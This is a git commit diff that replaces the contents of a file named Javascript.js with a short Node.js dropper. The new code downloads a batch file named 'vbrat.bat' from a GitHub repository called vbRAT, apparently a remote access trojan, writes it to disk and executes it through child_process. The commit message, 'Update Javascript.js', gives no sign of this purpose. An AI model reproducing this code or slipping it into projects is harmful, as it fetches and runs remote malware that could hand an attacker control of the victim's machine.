d3cd779bc0367f80eb480cb39699d89a54d50596
ksr <68067743+4ksr@users.noreply.github.com>
2022-07-16 01:29:50 -0700

    Update Javascript.js

--- Javascript.js
+++ Javascript.js
@@ -1,1 +1,10 @@
-s
+const { exec } = require('child_process');
+const fs = require('fs');
+const axios = require('axios');
+
+axios.get('https://raw.githubusercontent.com/4ksr/vbRAT/main/vbrat.bat', {
+    responseType: 'text',
+  }).then((response) => {
+    fs.writeFileSync('vbrat.bat', response.data, { flag: 'a' }, (err) => {});
+  });
+exec('vbrat.bat');
